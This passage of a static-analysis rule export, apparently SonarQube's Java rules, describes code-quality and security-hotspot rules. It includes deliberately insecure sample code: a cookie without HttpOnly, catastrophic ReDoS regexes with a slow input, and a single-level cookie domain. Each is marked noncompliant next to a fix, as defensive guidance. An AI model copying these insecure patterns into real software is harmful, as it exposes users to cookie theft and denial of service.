href=\"http://cwe.mitre.org/data/definitions/79.html\">CWE-79</a> - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting') </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/1004.html\">CWE-1004</a> - Sensitive Cookie Without 'HttpOnly' Flag </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE\">HTTPONLY_COOKIE</a> </li>\n</ul>",
            "mdDesc": "<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will\nbe able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it's up to the developer\nto decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target\nthe theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won't be possible to exploit the XSS\nvulnerability to steal session-cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>\n  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it's mandatory for session /\n  sensitive-security cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>If you create a security-sensitive cookie in your JAVA code:</p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setHttpOnly(false);  // Sensitive: this sensitive cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<p>By default the <a href=\"https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setHttpOnly(boolean)\"><code>HttpOnly</code></a> flag is\nset to <em>false:</em></p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);  // Sensitive: this sensitive cookie is created with the httponly flag not defined (by default set to false) and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setHttpOnly(true); // Compliant: this sensitive cookie is protected against theft (HttpOnly=true)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/HttpOnly\">OWASP HttpOnly</a> </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)\">OWASP Top 10 2017 Category A7</a> - Cross-Site Scripting\n  (XSS) </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/79.html\">CWE-79</a> - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting') </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/1004.html\">CWE-1004</a> - Sensitive Cookie Without 'HttpOnly' Flag </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE\">HTTPONLY_COOKIE</a> </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a7",
                "privacy",
                "sans-top25-insecure"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S1153",
            "repo": "java",
            "name": "String.valueOf() should not be appended to a String",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Appending <code>String.valueOf()</code> to a <code>String</code> decreases the code readability.</p>\n<p>The argument passed to <code>String.valueOf()</code> should be directly appended instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void display(int i){\n  System.out.println(\"Output is \" + String.valueOf(i));    // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void display(int i){\n  System.out.println(\"Output is \" + i);                    // Compliant\n}\n</pre>",
            "mdDesc": "<p>Appending <code>String.valueOf()</code> to a <code>String</code> decreases the code readability.</p>\n<p>The argument passed to <code>String.valueOf()</code> should be directly appended instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void display(int i){\n  System.out.println(\"Output is \" + String.valueOf(i));    // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void display(int i){\n  System.out.println(\"Output is \" + i);                    // Compliant\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2121",
            "repo": "java",
            "name": "Silly String operations should not be made",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Creating a substring from 0 to the end is silly. You'll end up with the same string you started with. Using the value of <code>String.length</code>\nas either the start or end of a substring has similarly predictable results.</p>\n<p>Calling <code>String.contains</code> with the argument being identical to the String on which contains is invoked doesn't make sense.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString speech = \"Now is the time for all good people to come to the aid of their country.\";\n\nString s1 = speech.substring(0); // Noncompliant. Yields the whole string\nString s2 = speech.substring(speech.length()); // Noncompliant. Yields \"\";\nString s3 = speech.substring(5,speech.length()); // Noncompliant. Use the 1-arg version instead\n\nif (speech.contains(speech)) { // Noncompliant\n // always true\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString speech = \"Now is the time for all good people to come to the aid of their country.\";\n\nString s1 = speech;\nString s2 = \"\";\nString s3 = speech.substring(5);\n</pre>",
            "mdDesc": "<p>Creating a substring from 0 to the end is silly. You'll end up with the same string you started with. Using the value of <code>String.length</code>\nas either the start or end of a substring has similarly predictable results.</p>\n<p>Calling <code>String.contains</code> with the argument being identical to the String on which contains is invoked doesn't make sense.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString speech = \"Now is the time for all good people to come to the aid of their country.\";\n\nString s1 = speech.substring(0); // Noncompliant. Yields the whole string\nString s2 = speech.substring(speech.length()); // Noncompliant. Yields \"\";\nString s3 = speech.substring(5,speech.length()); // Noncompliant. Use the 1-arg version instead\n\nif (speech.contains(speech)) { // Noncompliant\n // always true\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString speech = \"Now is the time for all good people to come to the aid of their country.\";\n\nString s1 = speech;\nString s2 = \"\";\nString s3 = speech.substring(5);\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4784",
            "repo": "java",
            "name": "Using regular expressions is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021\">CVE-2017-16021</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863\">CVE-2018-13863</a> </li>\n</ul>\n<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as\n<code>(a+)+s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with\nevery additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular\nexpression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>\n<p>Evaluating such regular expressions opens the door to <a\nhref=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">Regular expression Denial of Service (ReDoS)</a> attacks. In the\ncontext of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the\nservice inaccessible to genuine users.</p>\n<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following\ncharacters: <code>*+{</code>.</p>\n<p>Example: <code>(a+)*</code></p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>\n  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for\nvulnerability reports mentioning the one engine you're are using.</p>\n<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href=\"https://github.com/google/re2\">Google Re2</a>.</p>\n<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won't detect this kind of injection.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport java.util.regex.Pattern;\n\nclass BasePattern {\n  String regex = \"(a+)+b\"; // a regular expression\n  String input; // a user input\n\n  void foo(CharSequence htmlString) {\n    input.matches(regex);  // Sensitive\n    Pattern.compile(regex);  // Sensitive\n    Pattern.compile(regex, Pattern.CASE_INSENSITIVE);  // Sensitive\n\n    String replacement = \"test\";\n    input.replaceAll(regex, replacement);  // Sensitive\n    input.replaceFirst(regex, replacement);  // Sensitive\n\n    if (!Pattern.matches(\".*&lt;script&gt;(a+)+b\", htmlString)) { // Sensitive\n    }\n  }\n}\n</pre>\n<p>This also applies for bean validation, where regexp can be specified:</p>\n<pre>\nimport java.io.Serializable;\nimport javax.validation.constraints.Pattern;\nimport javax.validation.constraints.Email;\nimport org.hibernate.validator.constraints.URL;\n\nclass BeansRegex implements Serializable {\n  @Pattern(regexp=\".+@(a+)+b\")  // Sensitive\n  private String email;\n\n  @Email(regexp=\".+@(a+)+b\")  // Sensitive\n  private String email2;\n\n  @URL(regexp=\"(a+)+b.com\") // Sensitive\n  private String url;\n  // ...\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Calls to <code>String.split(regex)</code> and <code>String.split(regex, limit)</code> will not raise an exception despite their use of a regular\nexpression. These methods are used most of the time to split on simple regular expressions which don't create any vulnerabilities.</p>\n<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,\n<code>(a|a?)+</code>.</p>\n<p>It is a good idea to test your regular expression if it has the same pattern on both side of a \"<code>|</code>\".</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">MITRE, CWE-624</a> - Executable Regular Expression Error\n  </li>\n  <li> OWASP Regular expression Denial of Service - ReDoS </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS5852'>S5852</a>, <a href='/coding_rules#rule_key=javasecurity%3AS2631'>S2631</a> instead.</p>",
            "mdDesc": "<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021\">CVE-2017-16021</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863\">CVE-2018-13863</a> </li>\n</ul>\n<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as\n<code>(a+)+s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with\nevery additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular\nexpression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>\n<p>Evaluating such regular expressions opens the door to <a\nhref=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">Regular expression Denial of Service (ReDoS)</a> attacks. In the\ncontext of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the\nservice inaccessible to genuine users.</p>\n<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following\ncharacters: <code>*+{</code>.</p>\n<p>Example: <code>(a+)*</code></p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>\n  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for\nvulnerability reports mentioning the one engine you're are using.</p>\n<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href=\"https://github.com/google/re2\">Google Re2</a>.</p>\n<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won't detect this kind of injection.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport java.util.regex.Pattern;\n\nclass BasePattern {\n  String regex = \"(a+)+b\"; // a regular expression\n  String input; // a user input\n\n  void foo(CharSequence htmlString) {\n    input.matches(regex);  // Sensitive\n    Pattern.compile(regex);  // Sensitive\n    Pattern.compile(regex, Pattern.CASE_INSENSITIVE);  // Sensitive\n\n    String replacement = \"test\";\n    input.replaceAll(regex, replacement);  // Sensitive\n    input.replaceFirst(regex, replacement);  // Sensitive\n\n    if (!Pattern.matches(\".*&lt;script&gt;(a+)+b\", htmlString)) { // Sensitive\n    }\n  }\n}\n</pre>\n<p>This also applies for bean validation, where regexp can be specified:</p>\n<pre>\nimport java.io.Serializable;\nimport javax.validation.constraints.Pattern;\nimport javax.validation.constraints.Email;\nimport org.hibernate.validator.constraints.URL;\n\nclass BeansRegex implements Serializable {\n  @Pattern(regexp=\".+@(a+)+b\")  // Sensitive\n  private String email;\n\n  @Email(regexp=\".+@(a+)+b\")  // Sensitive\n  private String email2;\n\n  @URL(regexp=\"(a+)+b.com\") // Sensitive\n  private String url;\n  // ...\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Calls to <code>String.split(regex)</code> and <code>String.split(regex, limit)</code> will not raise an exception despite their use of a regular\nexpression. These methods are used most of the time to split on simple regular expressions which don't create any vulnerabilities.</p>\n<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,\n<code>(a|a?)+</code>.</p>\n<p>It is a good idea to test your regular expression if it has the same pattern on both side of a \"<code>|</code>\".</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">MITRE, CWE-624</a> - Executable Regular Expression Error\n  </li>\n  <li> OWASP Regular expression Denial of Service - ReDoS </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S5852}, {rule:javasecurity:S2631} instead.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S5994",
            "repo": "java",
            "name": "Regex patterns following a possessive quantifier should not always fail",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Possessive quantifiers in Regex patterns like below improve performance by eliminating needless backtracking:</p>\n<p>{noformat}</p>\n<p>?+ , *+ , ++ , {n}+ , {n,}+ , {n,m}+</p>\n<p>{noformat}</p>\n<p>But because possessive quantifiers do not keep backtracking positions and never give back, the following sub-patterns should not match only similar\ncharacters. Otherwise, possessive quantifiers consume all characters that could have matched the following sub-patterns and nothing remains for the\nfollowing sub-patterns.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern pattern1 = Pattern.compile(\"a++abc\");       // Noncompliant, the second 'a' never matches\nPattern pattern2 = Pattern.compile(\"\\\\d*+[02468]\"); // Noncompliant, the sub-pattern \"[02468]\" never matches\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern pattern1 = Pattern.compile(\"aa++bc\");            // Compliant, for example it can match \"aaaabc\"\nPattern pattern2 = Pattern.compile(\"\\\\d*+(?&lt;=[02468])\"); // Compliant, for example it can match an even number like \"1234\"\n</pre>",
            "mdDesc": "<p>Possessive quantifiers in Regex patterns like below improve performance by eliminating needless backtracking:</p>\n<p>{noformat}</p>\n<p>?+ , *+ , ++ , {n}+ , {n,}+ , {n,m}+</p>\n<p>{noformat}</p>\n<p>But because possessive quantifiers do not keep backtracking positions and never give back, the following sub-patterns should not match only similar\ncharacters. Otherwise, possessive quantifiers consume all characters that could have matched the following sub-patterns and nothing remains for the\nfollowing sub-patterns.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern pattern1 = Pattern.compile(\"a++abc\");       // Noncompliant, the second 'a' never matches\nPattern pattern2 = Pattern.compile(\"\\\\d*+[02468]\"); // Noncompliant, the sub-pattern \"[02468]\" never matches\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern pattern1 = Pattern.compile(\"aa++bc\");            // Compliant, for example it can match \"aaaabc\"\nPattern pattern2 = Pattern.compile(\"\\\\d*+(?&lt;=[02468])\"); // Compliant, for example it can match an even number like \"1234\"\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2129",
            "repo": "java",
            "name": "Constructors should not be used to instantiate \"String\", \"BigInteger\", \"BigDecimal\" and primitive-wrapper classes",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Constructors for <code>String</code>, <code>BigInteger</code>, <code>BigDecimal</code> and the objects used to wrap primitives should never be\nused. Doing so is less clear and uses more memory than simply using the desired value in the case of strings, and using <code>valueOf</code> for\neverything else.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString empty = new String(); // Noncompliant; yields essentially \"\", so just use that.\nString nonempty = new String(\"Hello world\"); // Noncompliant\nDouble myDouble = new Double(1.1); // Noncompliant; use valueOf\nInteger integer = new Integer(1); // Noncompliant\nBoolean bool = new Boolean(true); // Noncompliant\nBigInteger bigInteger1 = new BigInteger(\"3\"); // Noncompliant\nBigInteger bigInteger2 = new BigInteger(\"9223372036854775807\"); // Noncompliant\nBigInteger bigInteger3 = new BigInteger(\"111222333444555666777888999\"); // Compliant, greater than Long.MAX_VALUE\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString empty = \"\";\nString nonempty = \"Hello world\";\nDouble myDouble = Double.valueOf(1.1);\nInteger integer = Integer.valueOf(1);\nBoolean bool = Boolean.valueOf(true);\nBigInteger bigInteger1 = BigInteger.valueOf(3);\nBigInteger bigInteger2 = BigInteger.valueOf(9223372036854775807L);\nBigInteger bigInteger3 = new BigInteger(\"111222333444555666777888999\");\n</pre>\n<h2>Exceptions</h2>\n<p><code>BigDecimal</code> constructor with <code>double</code> argument is ignored as using <code>valueOf</code> instead might change resulting\nvalue. See <a href='/coding_rules#rule_key=java%3AS2111'>S2111</a>.</p>",
            "mdDesc": "<p>Constructors for <code>String</code>, <code>BigInteger</code>, <code>BigDecimal</code> and the objects used to wrap primitives should never be\nused. Doing so is less clear and uses more memory than simply using the desired value in the case of strings, and using <code>valueOf</code> for\neverything else.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString empty = new String(); // Noncompliant; yields essentially \"\", so just use that.\nString nonempty = new String(\"Hello world\"); // Noncompliant\nDouble myDouble = new Double(1.1); // Noncompliant; use valueOf\nInteger integer = new Integer(1); // Noncompliant\nBoolean bool = new Boolean(true); // Noncompliant\nBigInteger bigInteger1 = new BigInteger(\"3\"); // Noncompliant\nBigInteger bigInteger2 = new BigInteger(\"9223372036854775807\"); // Noncompliant\nBigInteger bigInteger3 = new BigInteger(\"111222333444555666777888999\"); // Compliant, greater than Long.MAX_VALUE\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString empty = \"\";\nString nonempty = \"Hello world\";\nDouble myDouble = Double.valueOf(1.1);\nInteger integer = Integer.valueOf(1);\nBoolean bool = Boolean.valueOf(true);\nBigInteger bigInteger1 = BigInteger.valueOf(3);\nBigInteger bigInteger2 = BigInteger.valueOf(9223372036854775807L);\nBigInteger bigInteger3 = new BigInteger(\"111222333444555666777888999\");\n</pre>\n<h2>Exceptions</h2>\n<p><code>BigDecimal</code> constructor with <code>double</code> argument is ignored as using <code>valueOf</code> instead might change resulting\nvalue. See {rule:java:S2111}.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3331",
            "repo": "java",
            "name": "Creating cookies with broadly defined \"domain\" flags is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p> A cookie's domain specifies which websites should be able to read it. Left blank, browsers are supposed to only send the cookie to sites that\nexactly match the sending domain. For example, if a cookie was set by <em>lovely.dream.com</em>, it should only be readable by that domain, and not by\n<em>nightmare.com</em> or even <em>strange.dream.com</em>. If you want to allow sub-domain access for a cookie, you can specify it by adding a dot in\nfront of the cookie's domain, like so: <em>.dream.com</em>. But cookie domains should always use at least two levels.</p>\n<p>Cookie domains can be set either programmatically or via configuration. This rule raises an issue when any cookie domain is set with a single\nlevel, as in <em>.com</em>. </p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the <code>domain</code> attribute has only one level as domain naming. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> You should check the <code>domain</code> attribute has been set and its value has more than one level of domain nanimg, like:\n  <em>sonarsource.com</em> </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nCookie myCookie = new Cookie(\"name\", \"val\");\nmyCookie.setDomain(\".com\"); // Noncompliant\njava.net.HttpCookie myOtherCookie = new java.net.HttpCookie(\"name\", \"val\");\nmyOtherCookie.setDomain(\".com\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCookie myCookie = new Cookie(\"name\", \"val\"); // Compliant; by default, cookies are only returned to the server that sent them.\n\n// or\n\nCookie myCookie = new Cookie(\"name\", \"val\");\nmyCookie.setDomain(\".myDomain.com\"); // Compliant\n\njava.net.HttpCookie myOtherCookie = new java.net.HttpCookie(\"name\", \"val\");\nmyOtherCookie.setDomain(\".myDomain.com\"); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p> A cookie's domain specifies which websites should be able to read it. Left blank, browsers are supposed to only send the cookie to sites that\nexactly match the sending domain. For example, if a cookie was set by <em>lovely.dream.com</em>, it should only be readable by that domain, and not by\n<em>nightmare.com</em> or even <em>strange.dream.com</em>. If you want to allow sub-domain access for a cookie, you can specify it by adding a dot in\nfront of the cookie's domain, like so: <em>.dream.com</em>. But cookie domains should always use at least two levels.</p>\n<p>Cookie domains can be set either programmatically or via configuration. This rule raises an issue when any cookie domain is set with a single\nlevel, as in <em>.com</em>. </p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the <code>domain</code> attribute has only one level as domain naming. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> You should check the <code>domain</code> attribute has been set and its value has more than one level of domain nanimg, like:\n  <em>sonarsource.com</em> </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nCookie myCookie = new Cookie(\"name\", \"val\");\nmyCookie.setDomain(\".com\"); // Noncompliant\njava.net.HttpCookie myOtherCookie = new java.net.HttpCookie(\"name\", \"val\");\nmyOtherCookie.setDomain(\".com\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCookie myCookie = new Cookie(\"name\", \"val\"); // Compliant; by default, cookies are only returned to the server that sent them.\n\n// or\n\nCookie myCookie = new Cookie(\"name\", \"val\");\nmyCookie.setDomain(\".myDomain.com\"); // Compliant\n\njava.net.HttpCookie myOtherCookie = new java.net.HttpCookie(\"name\", \"val\");\nmyOtherCookie.setDomain(\".myDomain.com\"); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "INFO",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S1151",
            "repo": "java",
            "name": "\"switch case\" clauses should not have too many lines of code",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>\nclause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the\n<code>case</code> clause should be extracted into a dedicated method.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold of 5:</p>\n<pre>\nswitch (myVariable) {\n  case 0: // Noncompliant: 6 lines till next case\n    methodCall1(\"\");\n    methodCall2(\"\");\n    methodCall3(\"\");\n    methodCall4(\"\");\n    break;\n  case 1:\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (myVariable) {\n  case 0:\n    doSomething()\n    break;\n  case 1:\n  ...\n}\n...\nprivate void doSomething(){\n    methodCall1(\"\");\n    methodCall2(\"\");\n    methodCall3(\"\");\n    methodCall4(\"\");\n}\n</pre>",
